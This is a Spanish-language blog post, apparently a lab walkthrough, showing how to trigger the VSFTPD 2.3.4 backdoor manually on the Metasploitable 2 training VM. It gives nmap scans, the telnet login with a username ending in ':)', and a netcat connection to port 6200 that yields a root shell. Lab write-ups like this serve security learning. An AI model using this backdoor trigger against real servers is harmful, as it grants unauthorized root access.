---
layout: post
title: Metasploitable 2, Atacando manualmente el puerto 21 VSFTPD 2.3.4
category: Hacking
comments: true
description: En el articulo anterior atacamos esta vulnerabilidad con ayuda de Metasploit, pero esta vez lo haremos manualmente, ya que al ser un backdoor, fue una vulnerabilidad creada a posta por alguien con malas intenciones, en este post veremos como ejecutar un backdoor de la manera original sin necesidad de usar Metasploit.
tags:       
    - hacker
    - metasploitable2
    - metasploit
---

En el articulo anterior atacamos esta vulnerabilidad con ayuda de Metasploit, pero esta vez lo haremos manualmente, ya que al ser un backdoor, fue una vulnerabilidad creada a posta por alguien con malas intenciones, en este post veremos como ejecutar un backdoor de la manera original sin necesidad de usar Metasploit.

Para descargarte [Metasploitable 2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/){:target="_blank"}

Recuerda que puedes ver el articulo de como usamos esta vulnerabilidad con metasploit [aqui](http://h1rd.com/hacking/Metasploitable2-vsftpd)

## Puertos abiertos antes de empezar

Antes de empezar es recomendable que veamos cuales son los puertos abiertos de nuestra maquina objetivo, ya vereis que despues de abrir el backdoor habra otro puerto más abierto.

{% highlight sql linenos %}

Nmap scan report for 192.168.1.41
Host is up (0.00037s latency).
Not shown: 65501 closed ports
PORT      STATE    SERVICE
21/tcp    open     ftp
22/tcp    open     ssh
23/tcp    open     telnet
25/tcp    open     smtp
53/tcp    open     domain
80/tcp    open     http
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
512/tcp   open     exec
513/tcp   open     login
514/tcp   open     shell
1099/tcp  open     rmiregistry
1524/tcp  open     ingreslock
2049/tcp  open     nfs
2121/tcp  open     ccproxy-ftp
3306/tcp  open     mysql
3632/tcp  open     distccd
4239/tcp  filtered vrml-multi-use
5432/tcp  open     postgresql
5900/tcp  open     vnc
6000/tcp  open     X11
6667/tcp  open     irc
6697/tcp  open     ircs-u
8009/tcp  open     ajp13
8180/tcp  open     unknown
8787/tcp  open     msgsrvr
27242/tcp filtered unknown
34652/tcp open     unknown
35474/tcp filtered unknown
41271/tcp open     unknown
41542/tcp open     unknown
42726/tcp open     unknown
54399/tcp filtered unknown
MAC Address: 00:0C:29:D3:5F:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 185.82 seconds

{% endhighlight %}


## Usando el backdoor

Para usar el backdoor nos conectamos al ftp desde telnet, en donde pasaremos un USER que tiene que acabar con :) y un PASS cualquiera, luego tenemos que salir, para ello pulsamos CONTROL+5 y salimos de telnet.

{% highlight sql linenos %}

telnet 192.168.1.41 21
USER hola:)
PASS nolose

(pulsamos control +5)

quit.

{% endhighlight %}


Y si ahora ejecutaramos otra vez el nmap veriamos que tenemos un nuevo puerto abierto en el 6200.

{% highlight sql linenos %}

Nmap scan report for 192.168.1.41
Host is up (0.00036s latency).
Not shown: 65504 closed ports
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6200/tcp  open  lm-x
6667/tcp  open  irc
6697/tcp  open  ircs-u
8009/tcp  open  ajp13
8180/tcp  open  unknown
8787/tcp  open  msgsrvr
34652/tcp open  unknown
41271/tcp open  unknown
41542/tcp open  unknown
42726/tcp open  unknown
MAC Address: 00:0C:29:D3:5F:CD (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.54 seconds

{% endhighlight %}

Ahora seria tan facil como abrir un netcat o un telnet al puerto 6200... y ala.. ya somos root!

{% highlight sql linenos %}

nc 192.168.1.41 6200

{% endhighlight %}

<figure>
<img alt="Acceso root a la maquina objetivo después de usar el backdoor" class="img img-responsive" src="/resources/images/exploit-vsftpd-manual.png"/>
<figcaption>
Acceso root a la maquina objetivo después de usar el backdoor
</figcaption>
</figure>

